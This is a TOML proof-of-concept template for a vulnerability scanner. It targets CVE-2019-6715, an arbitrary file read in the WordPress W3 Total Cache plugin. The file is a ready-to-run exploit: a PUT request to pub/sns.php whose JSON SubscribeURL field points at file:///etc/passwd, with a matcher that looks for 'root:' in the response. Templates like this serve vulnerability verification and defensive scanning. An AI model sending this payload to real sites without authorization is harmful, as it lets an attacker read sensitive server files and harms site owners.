[info]
author = "ave"
description = "验证 WordPress W3 Total Cache 插件任意文件读取漏洞（CVE-2019-6715）。攻击者可通过向 pub/sns.php 发送包含恶意 SubscribeURL 字段的 SubscriptionConfirmation JSON 数据，利用 file:// 协议读取服务器上的任意敏感文件，如 /etc/passwd。"
id = "POC-AVE-2019-0184"
name = "CVE-2019-6715 PoC"
severity = "high"
tags = ["ave-2019-0184"]
vuln_id = [
    "CVE-2019-6715",
    "AVE-2019-0184",
]

[poc]
logic = "all"

[[poc.requests]]
method = "PUT"
path = "/{{BaseURL}}/wp-content/plugins/w3-total-cache/pub/sns.php"
protocol = "http"

[poc.requests.body]
content = '{"Type":"SubscriptionConfirmation","Message":"","SubscribeURL":"file:///etc/passwd"}'
type = "raw"

[poc.requests.headers]
Content-Type = "application/x-www-form-urlencoded"
User-Agent = "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.80 Safari/537.36"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = ["root:"]
